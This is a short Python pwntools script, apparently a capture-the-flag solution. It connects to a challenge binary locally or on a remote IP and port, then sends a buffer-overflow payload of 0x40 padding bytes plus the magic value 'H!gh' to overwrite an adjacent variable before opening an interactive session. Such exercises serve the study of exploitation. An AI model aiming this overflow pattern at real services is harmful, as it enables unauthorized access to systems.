#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
local = 0
if local:
    p = process('./pwn0')
else:
    p = remote('104.154.106.182', 1234)
payload = 'A' * 0x40 + 'H!gh'
p.sendline(payload)
p.interactive()
